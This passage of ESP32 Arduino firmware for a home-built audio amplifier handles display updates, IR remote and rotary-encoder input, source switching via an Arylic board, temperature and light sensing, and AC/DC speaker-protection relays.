      if ((lastMillis + 1500) < millis()) {
        nextion.val(""vaMCU"", 23);
        lastMillis = millis();
      }
      if (Serial1.available() > 0) {
        nReceived = Serial1.readStringUntil(';');
        Serial.println(nReceived);
      }
      if (nReceived.endsWith(""42"")) {
        nextion.val(""vaMCU"", 1);
        state = 1;
        //exit;  //break;
      }
      Serial.println(nReceived);
      Serial.printf(""State: %i\n"", state);
    }
    Serial.printf(""Nextion Communication test done. State: %i\n"", state);

    //------
    while (state == 1) {  //I2C check
      //to be written later
      i2cCheck();
      nextion.val(""vaRTC"", 1);
      state = 2;
      Serial.printf(""State: %i\n"", state);
    }
    Serial.printf(""RTC check done. State: %i\n"", state);
    lastMillis = millis();


    relays.powerEnable = 1;  //AC relay ON (Enabled)
    relays.speakerEnable = 0;
    relays.power(ONs);
    delay(1000);

    //-----
    do {

      readProtection();
      Serial.println(""ReadProtection"");
    } while (protectionErrors);
        relays.speakerEnable = 1;

    nextion.val(""boot.vaSupply"", 1);
    nextion.val(""boot.vaProtection"", 1);
    Serial.printf(""Protection check done. State: %i\n"", state);

    int Arylic = 0;
    Serial.printf(""State: %i\n"", state);
    uart.print(""SYS:REBOOT;"");

    while (state == 2) {
      Serial.println(""Reboot sent"");
      do {  //
        if (uart.available() > 0) {
          sReceived = uart.readStringUntil(';');
          Serial.print(""rrrrrrrrrrr "");
          Serial.println(sReceived);
          if (sReceived.startsWith(""MUT:"")) {  //aud
            Serial.println(""In the loop"");

            nextion.val(""vaArylic"", 1);
            delay(1000);

            state = 3;
          }
          sReceived = """";
        }
      } while (state == 2);
      // uart.print(""SYS:STANDBY;"");
    }

    if (debug == 3) {
      Serial.printf(""All check done. State: %i\n"", state);
    }
    Serial.println(state);
    // If all ok, then automatic page change: ""Standby""
    return 1;
  }
} power;

void reduce4n() {
  nReceived = nReceived.substring(4);
  Serial.println(""-----reduce4n----"");
}
void initWiFi() {  ////////////////////////////////// INIT WIFI
  WiFi.mode(WIFI_STA);
  WiFi.begin(ssid, password);
  Serial.print(""Connecting to WiFi .."");
  while (WiFi.status() != WL_CONNECTED) {
    Serial.print('.');
    delay(1000);
  }
  Serial.println(WiFi.localIP());
}
void readRTC() {  ////////////////////////////////// DS3231 realtime clock module
  char name[DATE_STRING_SHORT + 1];
  uint8_t hour;
  uint8_t min;
  uint8_t sec;
  uint8_t mday;
  uint8_t mon;
  uint16_t year;
  uint8_t wday;

  // Read date/time
  if (!rtc.getDateTime(&hour, &min, &sec, &mday, &mon, &year, &wday)) {
    Serial.println(F(""Read date/time failed""));
    return;
  }

  // Print day week
  strncpy_P(name, &(dayNames_P[wday * DATE_STRING_SHORT]), DATE_STRING_SHORT);
  name[DATE_STRING_SHORT] = '\0';
  // Serial.print(name);
  // Serial.print(F("" ""));

  // Print month
  strncpy_P(name, &(monthNames_P[(mon - 1) * DATE_STRING_SHORT]), DATE_STRING_SHORT);
  name[DATE_STRING_SHORT] = '\0';
  // Serial.print(name);
  // Serial.print(F("" ""));

  // Print day month
  //  Serial.print(mday);
  // Serial.print(F("" ""));

  // Print time
  // Serial.print(hour);
  Serial1.print(""rtc3="" + String(hour) + ""\xFF\xFF\xFF"");  //hour
                                                           // Serial.print(F("":""));
                                                           //  if (min < 10) {
                                                           //   Serial.print(F(""0""));
                                                           //  }
                                                           // Serial.print(min);
  Serial1.print(""rtc4="" + String(min) + ""\xFF\xFF\xFF"");   //minute
                                                           // Serial.print(F("":""));
                                                           // if (sec < 10) {
                                                           //   Serial.print(F(""0""));
                                                           // }
                                                           // Serial.print(sec);
  Serial1.print(""rtc5="" + String(sec) + ""\xFF\xFF\xFF"");   //second
                                                           // Serial.print(F("" ""));

  // Print year
  // Serial.println(year);

  // Wait a second
  //delay(1000);
}
void rotary_loop() {  ////////////////////////////////// ENCODER LOOP
                      // int tempVol;
                      // if(rotaryEncoder.encoderChanged()){
                      //    tempVol=rotaryEncoder.readEncoder();
                      //    Serial.print(""-"");
                      // }
  if (rotaryEncoder.encoderChanged()) {
    if (debug == 1) Serial.print(""Value: "");
    if (debug == 1) Serial.println(rotaryEncoder.readEncoder());
    if (NextionPage == main) {
      uart.print(""VOL:"" + String(rotaryEncoder.readEncoder()) + "";"");
      Serial.println(rotaryEncoder.readEncoder());
      digiVolume = rotaryEncoder.readEncoder();
    }
    int temp1 = rotaryEncoder.readEncoder();
  }
  if (rotaryEncoder.isEncoderButtonClicked()) {
    rotary_onButtonClick();
  }
}
void rotary_onButtonClick() {  ////////////////////////////////// ENCODER SW
  static unsigned long lastTimePressed = 0;
  //ignore multiple press in that time milliseconds
  if (millis() - lastTimePressed < 500) {
    return;
  }
  lastTimePressed = millis();
  if (debug == 1) Serial.print(""button pressed "");
  if (debug == 1) Serial.print(millis());
  if (debug == 1) Serial.println("" milliseconds after restart"");
  if (dmute == 0) {
    uart.print(""MUT:1;"");
  } else {
    uart.print(""MUT:0;"");
  }
}
void IRAM_ATTR readEncoderISR() {  ////////////////////////////////// ENCODER INTERRUPT
  rotaryEncoder.readEncoder_ISR();
}
void IRAM_ATTR stateRight_ISR() {  ////////////////////////////////// RIGHT INTERRUPT
  dcErrorRight = 1;
}
void IRAM_ATTR stateLeft_ISR() {  ////////////////////////////////// LEFT INTERRUPT
  dcErrorLeft = 1;
}
void IRAM_ATTR stateAC_ISR() {  ////////////////////////////////// AC INTERRUPT
  ac_time = millis();
  if (ac_time - ac_time_last > 250) {
    acError = 1;
    ac_protect = 1;
    digitalWrite(pwr, LOW);
    ac_time_last = ac_time;
  }
}
void meta(int t, int e, int v, int i) {  ////////////////////////////////// DIGI METADATA
  nextion.vis(""main.title"", t);
  nextion.vis(""main.elapsed"", e);
  nextion.vis(""main.vendor"", v);
  nextion.vis(""main.infoText"", i);
}
void beep_2k() {  ////////////////////////////////// 2KhZ BEEP
  unsigned long currentMillis = millis();
  if (currentMillis - beepMillis >= 1000) {
    if (beep == 0) {
      // tone(12, 2000, 50);
    } else {
      // tone(12, 2000, 50);
    }
    beepMillis = currentMillis;
  }
}
void beep_3k() {  ////////////////////////////////// 3KhZ BEEP
  unsigned long currentMillis = millis();
  if (currentMillis - beepMillis >= 2000) {
    if (beep == 0) {
      // tone(12, 3000, 1000);
    } else {
      // tone(12, 3000, 1000);
    }
    beepMillis = currentMillis;
  }
}
void inputLed(int input) {  ////////////////////////////////// LED FOR SOURCE
  source = input;
  int r = 0, g = 0, b = 0;
  switch (input) {
    case 0:  // WiFi - net
      // if (powerState == 0) break;
      r = 59;
      g = 60;
      b = 61;
      break;
    case 1:  // Bluetooth - bt
      // if (powerState == 0) break;
      r = 0;
      g = 0;
      b = 50;
      break;
    case 2:  // Line-In - line_in
      // if (powerState == 0) break;
      r = 0;
      g = 50;
      b = 0;
      break;
    case 3:  // SPDIF - opt
      // if (powerState == 0) break;
      r = 50;
      g = 0;
      b = 0;
      break;
    case 4:  // USB-DAC - usb dac
      r = 12;
      g = 67;
      b = 5;
      break;
    case 5:  //Standby
      r = 55;
      g = 35;
      b = 0;
      break;
    case 6:  //NET connect
      r = 59;
      g = 60;
      b = 61;
      break;
    case 7:  //NET disconnect
      r = 29;
      g = 30;
      b = 31;
      break;
    case 8:  //BT connect
      r = 0;
      g = 0;
      b = 50;
      break;
    case 9:  //BT disconnect
      r = 0;
      g = 0;
      b = 10;
      break;
  }

  for (int i = 0; i < NUMPIXELS; i++) {
    pixels.setPixelColor(i, pixels.Color(g, r, b));
  }
  pixels.show();  // Send the updated pixel colors to the hardware.
}
void functionLed(int function) {  ////////////////////////////////// LED FOR FUNCTIONS
  task = function;
  int r = 0, g = 0, b = 0;
  switch (function) {
    case 0:  // task is ""ON""
      if (powerState == 0) break;
      r = 49;
      g = 50;
      b = 51;
      break;
    case 1:  // task is ""OFF""
      if (powerState == 0) break;
      r = 0;
      g = 0;
      b = 50;
      break;
    case 2:  // task is ""DC ERROR""
      if (powerState == 0) break;
      r = 0;
      g = 50;
      b = 0;
      break;
    case 3:  // task is ""Temp ERROR""
      if (powerState == 0) break;
      r = 50;
      g = 0;
      b = 0;
      break;
    case 4:  // task is ""System starting...""
      r = 55;
      g = 35;
      b = 0;
      break;
  }
  for (int i = 0; i < NUMPIXELS; i++) {
    pixels.setPixelColor(i, pixels.Color(g, r, b));
  }
  pixels.show();  // Send the updated pixel colors to the hardware.
}
void senseBrightness() {  ////////////////////////////////// SENSE BRIGHTNESS
  unsigned long currentTime = millis();
  if (currentTime - previousTime_1 >= eventTime_1_LDR) {
    String m;
    switch (analogRead(LDR)) {
      case 0 ... 40:
        dimN = 25;
        m = ""Dark"";
        break;
      case 41 ... 800:
        dimN = 40;
        m = ""Light"";
        break;
      case 801 ... 2000:
        dimN = 60;
        m = ""Bright"";
        break;
      case 2001 ... 3200:
        dimN = 80;
        m = ""Very Bright"";
        break;
      case 3201 ... 4500:
        dimN = 100;
        m = ""Very Very Bright"";
        break;
    }
    if (dim != dimN) {
      nextion.val(""ampSetup.nDimESP"", dimN);
      nextion.val(""ampSetup.hSlideESP"", dimN);
      Serial.println("" => "" + m);
      Serial.println(analogRead(LDR));
      dim = dimN;
    }
    previousTime_1 = currentTime;
  }
}
void senseTemp() {  ////////////////////////////////// SENSE TEMPERATURE
  static unsigned long timer1, timer2;
  if (millis() - timer1 > sense1) {  // firtst --> 1st
    timer1 = millis();
    //Serial.print(""Temp 1: "");
    //Serial.println(tmp1.readTemperature('c'));
    if (NextionPage == ampSetup) nextion.val(""ampSetup.nTempLeft"", tmp1.readTemperature('c'));
  }
  if (millis() - timer2 > sense2) {
    timer2 = millis();
    //Serial.print(""Temp 2: "");
    //Serial.println(tmp2.readTemperature('C'));
    if (NextionPage == ampSetup) nextion.val(""ampSetup.nTempRight"", tmp2.readTemperature('c'));
  }
}
void readProtection() {  ////////////////////////////////// READ COMPLETE PROTECTION (AC+DC)
  acError = !digitalRead(acSense);
  dcErrorRight = digitalRead(dcSenseRight);
  dcErrorLeft = digitalRead(dcSenseLeft);
  protectionErrors = dcErrorRight + dcErrorLeft + acError;
  if (acError == 1 && last.acError == 0) {
    relays.spk(OFFs);
    nextion.val(""ampSetup.vaAC"", 0);  //1 - OK
    nextion.systemVal(""warning"", 1);
    relays.speakerEnable=0; //no relay switch
  }
  last.acError = acError;

  if (dcErrorLeft == 1 && last.dcErrorLeft == 0) {
    relays.spk(OFFs);
    nextion.val(""ampSetup.vaLeft"", 0);
    nextion.systemVal(""warning"", 1);
    timer.protectionOffDelay=millis();


  }
  if (dcErrorRight == 1 && last.dcErrorLeft == 0) {
    relays.spk(OFFs);
    nextion.val(""ampSetup.vaRight"", 0);
    nextion.systemVal(""warning"", 1);
    timer.protectionOffDelay=millis();

  }
if(timer.protectionOffDelay+5000<millis()){
  relays.power(OFFs);
}
//timer.protectionOffDelay=-1 //turning off the delay function

  if (dcErrorRight != dcErrorRightLast) {
    if (dcErrorRight == 0) {
      if (debug == 2) Serial.println(""Right channel is OK!"");
      //nextion.systemVal(""warning"", 0);
      nextion.val(""ampSetup.vaRight"", 0);
      if (dcErrorLeft == 0 && self_test == 1) nextion.val(""boot.vaProtection"", 1);
    }
    if (dcErrorRight == 1) {
      if (debug == 2) Serial.println(""DC voltage on Right channel!"");
      nextion.systemVal(""warning"", 1);
      nextion.val(""ampSetup.vaRight"", 1);
      if (self_test == 1) nextion.val(""boot.vaProtection"", 0);
    }
    dcErrorRightLast = dcErrorRight;
  }

  if (dcErrorLeft != dcErrorLeftLast) {
    if (dcErrorLeft == 0) {
      if (debug == 2) Serial.println(""Left channel is OK!"");
      //nextion.systemVal(""warning"", 0);
      nextion.val(""ampSetup.vaLeft"", 0);
      if (dcErrorRight == 0 && self_test == 1) nextion.val(""boot.vaProtection"", 1);
    }
    if (dcErrorLeft == 1) {
      if (debug == 2) Serial.println(""DC voltage on Left channel!"");
      nextion.systemVal(""warning"", 1);
      nextion.val(""ampSetup.vaLeft"", 1);
      if (self_test == 1) nextion.val(""boot.vaProtection"", 0);
    }
    dcErrorLeftLast = dcErrorLeft;
  }

  if (dcErrorLeft == 1 || dcErrorRight == 1) {
    digitalWrite(speaker, LOW);
    //AC relay OFF
    nextion.vis(""ampSetup.reset"", 1);
    Serial.println(""DC voltage on output, speakers is OFF"");
  }

  if (acError != acErrorLast) {
    if (ac_protect == 1) {
      Serial.println(""Interrupt on AC pin"");
    }
    if (acError == 0) {
      if (debug == 2) Serial.println(""AC is OK!"");
      nextion.systemVal(""warning"", 0);
      nextion.val(""ampSetup.vaAC"", 0);
      //nextion.val(""boot.vaSupply"", 1);
    }
    if (acError == 1) {
      if (debug == 2) Serial.println(""Missing AC voltage!"");
      nextion.systemVal(""warning"", 1);
      nextion.val(""ampSetup.vaAC"", 1);
      //nextion.val(""boot.vaSupply"", 1);  // -> 0
      ac_protect = 0;
    }
    acErrorLast = acError;
  }
}
void readAC() {  ////////////////////////////////// READ POWER SUPPLY
  acError = digitalRead(acSense);

  if (acError != acErrorLast) {
    if (ac_protect == 1) {
      Serial.println(""Interrupt on AC pin"");
    }
    if (acError == 0) {
      if (debug == 2) Serial.println(""AC is OK!"");
      nextion.systemVal(""warning"", 0);
      nextion.val(""ampSetup.vaAC"", 0);
      nextion.val(""boot.vaSupply"", 1);
    }
    if (acError == 1) {
      if (debug == 2) Serial.println(""Missing AC voltage!"");
      nextion.systemVal(""warning"", 1);
      nextion.val(""ampSetup.vaAC"", 1);
      nextion.val(""boot.vaSupply"", 1);  // -> 0
      ac_protect = 0;
    }
    acErrorLast = acError;
  }
}
void readSignal() {
  if (strengthMillis + 1000 < millis() && source == 0) {
    uart.print(""WSS;"");
    strengthMillis = millis();
  }
  if (strengthMillis + 1000 < millis() && source == 1) {
    uart.print(""BSS;"");
    strengthMillis = millis();
  }
}
int i2cSend(int address) {
  Wire.beginTransmission(address);
  return Wire.endTransmission();
}
int numDevices = 6;
void i2cCheck() {
  numDevices = 6;

  tc74_1.state = i2cSend(tc74_1.address);
  numDevices--;
  (tc74_1.state == 0) ? tc74_1.stateStr = ""OK"" : tc74_1.stateStr = ""FAIL"";
  Serial.printf(""%s State: %s  I2C state: %i\n"", tc74_1.name, tc74_1.stateStr, tc74_1.state);
  //------------------------------
  tc74_2.state = i2cSend(tc74_2.address);
  numDevices--;
  (tc74_2.state == 0) ? tc74_2.stateStr = ""OK"" : tc74_2.stateStr = ""FAIL"";
  Serial.printf(""%s State: %s\n"", tc74_1.name, tc74_1.stateStr);
  //------------------------------
  rtcModule.state = i2cSend(rtcModule.address);
  numDevices--;
  (rtcModule.state == 0) ? rtcModule.stateStr = ""OK"" : rtcModule.stateStr = ""FAIL"";
  Serial.printf(""%s State: %s\n"", tc74_2.name, tc74_2.stateStr);
  //------------------------------
  rtcEEPROM.state = i2cSend(rtcEEPROM.address);
  numDevices--;
  (rtcEEPROM.state == 0) ? rtcEEPROM.stateStr = ""OK"" : rtcEEPROM.stateStr = ""FAIL"";
  Serial.printf(""%s State: %s\n"", rtcEEPROM.name, rtcEEPROM.stateStr);
  //------------------------------
  dspModule.state = i2cSend(dspModule.address);
  numDevices--;
  (dspModule.state == 0) ? dspModule.stateStr = ""OK"" : dspModule.stateStr = ""FAIL"";
  Serial.printf(""%s State: %s\n"", dspModule.name, dspModule.stateStr);
  //------------------------------
  dspEEPROM.state = i2cSend(dspModule.address);
  numDevices--;
  (dspEEPROM.state == 0) ? dspEEPROM.stateStr = ""OK"" : dspEEPROM.stateStr = ""FAIL"";
  Serial.printf(""%s State: %s\n"", dspEEPROM.name, dspEEPROM.stateStr);

  if (numDevices == 0) {
    //Serial.println(""I2C devices OK"");
  }
}

void setup() {  ////////////////////////////////// START OF SETUP
  Wire.begin(SDA, SCL);
  Serial.begin(115200);
  Serial1.begin(115200, SERIAL_8N1, RXN_PIN, TXN_PIN);
  uart.begin(115200, SERIAL_8N1, RX_PIN, TX_PIN);
  while (!Serial1)
    ;
  while (!uart)
    ;
  rtc.begin();
  tmp1.begin();
  tmp2.begin();
  pixels.begin();  // INITIALIZE NeoPixel strip object (REQUIRED)
  //clock.setDateTime(__DATE__, __TIME__);
  //rtc.adjust(DateTime(F(__DATE__), F(__TIME__)));   // When uploading the code, the computer's time settings are passed to the RTC. We REM it out the next time we upload.
  //rtc.adjust(DateTime(F(__DATE__), F(__TIME__)));

  tc74_1 = { ""TempL"", 0x4A, 0, ""FAIL"" };  //TC74 LEFT
  tc74_2 = { ""TempR"", 0X4B, 0, ""FAIL"" };  //TC74 RIGHT
  rtcModule = { ""RTC"", 0x68, 0, ""FAIL"" };
  rtcEEPROM = { ""RTC_EEPROM"", 0x57, 0, ""FAIL"" };
  dspModule = { ""DSP_Module"", 0x34, 0, ""FAIL"" };
  dspEEPROM = { ""DSP_EEPROM"", 0x50, 0, ""FAIL"" };

  pinMode(pwr, OUTPUT);
  digitalWrite(pwr, LOW);
  pinMode(speaker, OUTPUT);
  digitalWrite(speaker, LOW);

  pinMode(powerSW, INPUT_PULLUP);  // buttons is active LOW
  pinMode(dcSenseRight, INPUT_PULLUP);
  pinMode(dcSenseLeft, INPUT_PULLUP);
  pinMode(acSense, INPUT_PULLUP);
  rotaryEncoder.begin();
  rotaryEncoder.setup(readEncoderISR);
  //ir***********************************************************************************
  //  Serial.println(F(""START "" __FILE__ "" from "" __DATE__ ""\r\nUsing library version "" VERSION_IRREMOTE));
  //Start the receiver and if not 3. parameter specified, take LED_BUILTIN pin from the internal boards definition as default feedback LED
  IrReceiver.begin(IR_RECEIVE_PIN, ENABLE_LED_FEEDBACK);
  //  Serial.print(F(""Ready to receive IR signals of protocols: ""));
  //  printActiveIRProtocols(&Serial);
  //  Serial.println(F(""at pin "" STR(IR_RECEIVE_PIN)));
  //ir***********************************************************************************
  inputLed(4);
  nextion.pageChange(boot);
  nextion.txt(""boot.infoText"", ""System is starting..."");

  bool circleValues = false;
  /*Rotary acceleration introduced 25.2.2021.
   * in case range to select is huge, for example - select a value between 0 and 1000 and we want 785
   * without accelerateion you need long time to get to that number
   * Using acceleration, faster you turn, faster will the value raise.
   * For fine tuning slow down.
   */
  //rotaryEncoder.disableAcceleration(); //acceleration is now enabled by default - disable if you dont need it
  rotaryEncoder.setAcceleration(0);  //or set the value - larger number = more accelearation; 0 or 1 means disabled acceleration
  rotaryEncoder.setEncoderValue(digiVolume);
  rotaryEncoder.setBoundaries(0, 100, circleValues);      //minValue, maxValue, circleValues true|false (when max go to min and vice versa)
  attachInterrupt(dcSenseRight, stateRight_ISR, RISING);  //Interrupts for protection: left: RISING,right: RISING,AC: FALLING
  attachInterrupt(dcSenseLeft, stateLeft_ISR, RISING);
  attachInterrupt(acSense, stateAC_ISR, FALLING);
  //initWiFi();   //in the kitchen, no WIFI :D
  //String LocalIP = String() + WiFi.localIP()[0] + ""."" + WiFi.localIP()[1] + ""."" + WiFi.localIP()[2] + ""."" + WiFi.localIP()[3];
  //Serial.println(WiFi.localIP());
  //Serial.println(LocalIP);
  if (debug) Serial.println(""Starting.."");
  if (debug == 1) Serial.println(""Started..."");
  if (debug == 1) Serial.println(compile_date);
  uart.print(""PMT:1;"");
  uart.print(""BEP:0;"");
  uart.print(""BEP;"");
  uart.print(""PMT;"");
  nextion.touchSet(""main.preset"", 0);
  dcErrorRight = digitalRead(dcSenseRight);
  dcErrorLeft = digitalRead(dcSenseLeft);
  acError = digitalRead(acSense);

  //if (debug == 2) Serial.printf(""AC-%d DCL-%d DCR-%d\n"", acError, dcErrorLeft, dcErrorRight);
  uart.print(""SYS:STANDBY;"");  //Reboot Digi
  Serial.println(""Digi Off"");

  delay(5000);

  Serial.println(compile_date);
  Serial.println(""Arylic_0823"");
  readRTC();
  digitalWrite(pwr, HIGH);
  power.firstInitial();
}

void loop() {  ////////////////////////////////// START OF LOOP


  // while (NextionPage == boot) {
  //   // reading nextion
  //   // powerSW
  //   // IR
  // }

  // while (NextionPage == standby) {
  //   // reading nextion
  //   // powerSW
  //   // IR
  // }

  // while (NextionPage == main) {
  //   // reading nextion
  //   // reading digi
  //   // reading dsp
  //   // check protection
  //   // powerSW
  //   // IR
  // }



  if (NextionPage == main && speaker1timeon == 1 && millis() > speakerMillis) {
    digitalWrite(speaker, HIGH);
    speaker1timeon = 0;
  }

  // if (dcErrorLeft == 0 && dcErrorRight == 0) {
  //   // relays.spk(ON);
  //   relays.spk(ON);
  // }
  //  speaker1timeon = 0;
  // }

  readSignal();

  if (self_test == 0) {
    readProtection();
    senseBrightness();
    senseTemp();
    rotary_loop();

    if (IrReceiver.decode()) {  //////////// IR REMOTE HANDLING
      //  Serial.println(NextionPage);
      //  IrReceiver.printIRResultShort(&Serial);
      //  IrReceiver.printIRSendUsage(&Serial);
      if (IrReceiver.decodedIRData.protocol == UNKNOWN) {
        //  Serial.println(F(""Received noise or an unknown (or not yet enabled) protocol""));  // We have an unknown protocol here, print more inf
        //  IrReceiver.printIRResultRawFormatted(&Serial, true);
      }
      Serial.println();
      IrReceiver.resume();                                                             // Enable receiving of the next value
      if (IrReceiver.decodedIRData.command == 0x45 && (irMillis + 5000) < millis()) {  // Power button && irLastCode != IrReceiver.decodedIRData.command
        if (NextionPage == 2) {                                                        //0
          nextion.click(""powerOff"", 1);
          // tone(23, 1000, 50);
        }
        if (NextionPage == 1) {  //2
          nextion.click(""powerOn"", 1);
          readRTC();
          // tone(23, 1000, 50);
        }
        irMillis = millis();
        Serial.println(""Pressed: POWER"");
      } else if (IrReceiver.decodedIRData.command == 0x19) {  // BT button
        uart.print(""SRC:BT;"");
        Serial.println(""Pressed: BT"");
      } else if (IrReceiver.decodedIRData.command == 0xD) {  // FM button
        //uart.print(""SRC:BT;"");
        Serial.println(""Pressed: FM"");
      } else if (IrReceiver.decodedIRData.command == 0x09 && irVolMillis + 300 < millis()) {  // VolUp
        if (digiVolume < 100) {
          digiVolume = digiVolume + volStep;
          if (digiVolume > 100) digiVolume = 100;
        }
        irVolMillis = millis();
        Serial.println(digiVolume);
        uart.print(""VOL:"" + String(digiVolume) + "";"");
        Serial.println(""Pressed: VOL UP"");
      } else if (IrReceiver.decodedIRData.command == 0x15 && irVolMillis + 300 < millis()) {  // VolDown
        if (digiVolume > 0) {
          digiVolume = digiVolume - volStep;
          if (digiVolume < 0) digiVolume = 0;
        }
        irVolMillis = millis();
        Serial.println(digiVolume);
        uart.print(""VOL:"" + String(digiVolume) + "";"");
        Serial.println(""Pressed: VOL DOWN"");
      } else if (IrReceiver.decodedIRData.command == 0x46 && (irMillis + 5000) < millis()) {  // Input stepping
        if (sourceS < 4) {
          sourceS++;
        } else {
          sourceS = 0;
        }
        String inp[5] = { ""NET"", ""BT"", ""LINE-IN"", ""USBDAC"", ""OPT"" };
        uart.print(""SRC:"" + inp[sourceS] + "";"");
        Serial.println(""SRC:"" + inp[sourceS] + "";"");
        Serial.println(sourceS);
        irMillis = millis();
        Serial.println(""Pressed: MODE (input stepping)"");
      } else if (IrReceiver.decodedIRData.command == 0x7 && (irMillis + 5000) < millis()) {  // Muting
        if (NextionPage == main) {
          uart.print(""MUT:1;"");
        }
        if (NextionPage == main) {
          uart.print(""MUT:0;"");
        }
        irMillis = millis();
        Serial.println(""Pressed: MUTE"");
      } else if (IrReceiver.decodedIRData.command == 0x47) {  // Scan
        // uart.print(""SRC:NET;"");
        Serial.println(""Pressed: SCAN"");
      } else if (IrReceiver.decodedIRData.command == 0x43) {  // >> / Next track, only available in BT/NET/USB mode (*1)
        uart.print(""NXT;"");
        Serial.println(""Pressed: NEXT"");
      } else if (IrReceiver.decodedIRData.command == 0x40) {  // << / Previous track, only available in BT/NET/USB mode (*1)
        uart.print(""PRE;"");
        Serial.println(""Pressed: PREV"");
      } else if (IrReceiver.decodedIRData.command == 0x44) {  // Play/Pause track, only available in BT/NET/USB mode (*1)
        uart.print(""POP;"");
        Serial.println(""Pressed: PLAY/PAUSE"");
      } else if (IrReceiver.decodedIRData.command == 0xC) {  // 1
        uart.print(""PST:1;"");
        // digi.volume=digi.maxVolume-10;
        nextion.txt(""main.preset"", ""Preset 1"");
        Serial.println(""Pressed: BT1"");
      } else if (IrReceiver.decodedIRData.command == 0x18) {  // 2
        uart.print(""PST:2;"");
        nextion.txt(""main.preset"", ""Preset 2"");
        Serial.println(""Pressed: BT2"");
      } else if (IrReceiver.decodedIRData.command == 0x5E) {  // 3
        uart.print(""PST:3;"");
        nextion.txt(""main.preset"", ""Preset 3"");
        Serial.println(""Pressed: BT3"");
      } else if (IrReceiver.decodedIRData.command == 0x8) {  // 4
        uart.print(""PST:4;"");
        nextion.txt(""main.preset"", ""Preset 4"");
        Serial.println(""Pressed: BT4"");
      } else if (IrReceiver.decodedIRData.command == 0x1C) {  // 5
        uart.print(""PST:5;"");
        nextion.txt(""main.preset"", ""Preset 5"");
        Serial.println(""Pressed: BT5"");
      } else if (IrReceiver.decodedIRData.command == 0x5A) {  // 6
        uart.print(""PST:6;"");
        nextion.txt(""main.preset"", ""Preset 6"");
        Serial.println(""Pressed: BT6"");
      } else if (IrReceiver.decodedIRData.command == 0x42) {  // 7
        uart.print(""PST:7;"");
        nextion.txt(""main.preset"", ""Preset 7"");
        Serial.println(""Pressed: BT7"");
      } else if (IrReceiver.decodedIRData.command == 0x52) {  // 8
        uart.print(""PST:8;"");
        nextion.txt(""main.preset"", ""Preset 8"");
        Serial.println(""Pressed: BT8"");
      } else if (IrReceiver.decodedIRData.command == 0x4A) {  // 9
        uart.print(""PST:9;"");
        nextion.txt(""main.preset"", ""Preset 9"");
        Serial.println(""Pressed: BT9"");
      } else if (IrReceiver.decodedIRData.command == 0x16) {  // 0
        uart.print(""PST:10;"");
        nextion.txt(""main.preset"", ""Preset 10"");
        Serial.println(""Pressed: BT0"");
      }
    }

    if (digitalRead(powerSW) == 0 && lastPowerState == 1 && lastPressed + 5000 < millis()) {  //////////// POWER SW HANDLING digitalRead(powerSW) == 0 &&
      if (debug == 1) Serial.println(digitalRead(powerSW));
      if (powerState == 0 && NextionPage == 1) {
        powerState = 1;
        uart.print(""SYS:REBOOT;"");
        Serial.println(""---------- Power ON with button... ----------"");
        // tone(12, 1000, 50);
      } else {
        powerState = 0;
        //if (NextionPage == 2)
        uart.print(""SYS:STANDBY;"");
        Serial.println(""---------- Power OFF with button... ----------"");
        // tone(12, 1000, 50);
        inputLed(4);
      }
      lastPressed = millis();
    }
    lastPowerState = digitalRead(powerSW);  //1

    while (uart.available()) {  //////////// UART HANDLING FOR ARYLIC
      if (NextionPage == boot) nextion.val(""boot.vaArylic"", 1);
      sReceived = uart.readStringUntil('\n');
      sReceived.trim();
      if (debug == 1) Serial.println(""uart:___|----------"" + sReceived);
      if (debug == 1) Serial.println("""");
      if (sReceived.startsWith(""PLA:0"")) {
        nextion.txt(""main.infoText"", ""Szünet/Megállítva"");
      } else if (sReceived.startsWith(""PLA:1"")) {
        nextion.txt(""main.infoText"", ""Lejátszás..."");
      } else if (sReceived.startsWith(""STA:"")) {  //////////// STA HANDLING
        Serial.print(""STA: "");
        Serial.println(stacount);
        stacount++;
        if (initDigi == 1) {
          Serial.println(""STA, InitDigi1"");
          initDigi = 0;  //25.01.10
          nextion.val(""boot.vaArylic"", 1);
        } else if (NextionPage != main) {
          Serial.println(""STA, InitDigi0"");

          //nextion.pageChange(main);
          Serial.println(""Page changed..."");
          speakerMillis = millis() + 5000;
        }
        nextion.vis(""main.infoText"", 0);
        if (debug == 1) Serial.println(""STA received"");
        if (debug == 1) Serial.println(""Before: "" + sReceived);
        nextion.txt(""main.infoText"", """");
        // nextion.vis(""main.title"", 0);
        //  nextion.vis(""main.elapsed"", 0);
        // nextion.vis(""main.vendor"", 0);
        nextion.touchSet(""main.preset"", 0);
        reduce4();

        if (sReceived.startsWith(""NET"")) {  //////////// WIFI
          sourceS = 0;
          inputLed(0);
          meta(1, 1, 1, 1);
          if (debug == 1) Serial.println(""...WIFI..."");
          nextion.txt(""main.input"", ""WiFi"");
        } else if (sReceived.startsWith(""BT"")) {  //////////// BLUETOOTH
          sourceS = 1;
          inputLed(1);
          meta(0, 0, 0, 0);
          if (debug == 1) Serial.println(""...BLUETOOTH..."");
          nextion.txt(""main.input"", ""Bluetooth"");
        } else if (sReceived.startsWith(""LINE-IN"")) {  //////////// LINE-IN
          sourceS = 2;
          inputLed(2);
          meta(0, 0, 0, 0);
          if (debug == 1) Serial.println(""...LINE-IN..."");
          nextion.txt(""main.input"", ""Line In"");
        } else if (sReceived.startsWith(""USBDAC"")) {  //////////// USB DAC
          sourceS = 3;
          inputLed(3);
          meta(0, 0, 0, 0);
          if (debug == 1) Serial.println(""...USB DAC..."");
          nextion.txt(""main.input"", ""USB DAC"");
        } else if (sReceived.startsWith(""OPT"")) {  //////////// USB DAC
          sourceS = 4;
          inputLed(4);
          meta(0, 0, 0, 0);
          if (debug == 1) Serial.println(""...SPDIF..."");
          nextion.txt(""main.input"", ""SPDIF"");
        }
      } else if (sReceived.startsWith(""SYS:STANDBY"")) {  //////////// POWER OFF HANDLING
        initDigi = 0;                                    //25.01.10

        digitalWrite(pwr, LOW);
        digitalWrite(speaker, LOW);
        //
        nextion.pageChange(standby);
        //
        inputLed(4);
        Serial.println(""POWER OFF!!"");
        // // tone(23, 1000, 50);

      } else if (sReceived.startsWith(""SRC:"")) {  //////////// INPUT SOURCE HANDLING
                                                  // nextion.vis(""main.title"", 0);
                                                  // nextion.vis(""main.elapsed"", 0);
                                                  // nextion.vis(""main.vendor"", 0);
        nextion.touchSet(""main.preset"", 0);
        //nextion.pageChange(main);
        reduce4();

        if (sReceived.startsWith(""NET"")) {  //////////// WIFI
          sourceS = 0;
          inputLed(0);
          meta(1, 1, 1, 1);
          if (debug == 1) Serial.println(""...WIFI..."");
          nextion.txt(""main.input"", ""WiFi"");
